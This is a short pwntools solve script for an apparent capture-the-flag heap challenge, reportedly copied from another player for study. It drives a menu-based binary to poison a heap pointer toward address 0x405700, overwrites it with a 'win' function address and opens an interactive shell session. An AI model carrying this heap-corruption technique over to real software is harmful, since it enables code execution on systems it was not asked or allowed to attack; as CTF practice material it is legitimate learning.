from pwn import *

# this script from leducanhvu, i didnt solve this but its a nice chall that i want to re-check

host = 'challs.breachers.in'
port = 1341
#p = remote(host, port)

p = process("./main")

address_win = 0x00401330
p.sendline(b'4')
p.sendline(b'3')
p.sendline(b'2')
p.send(p64(0x405700))
p.recv()
# From now we can malloc until 0x405700 and beyond 
for i in range(9):
        p.sendline(b'4')

p.sendline(b'2')
p.sendline(p64(address_win) + p64(0x405700))
p.sendline(b'5')
p.interactive()
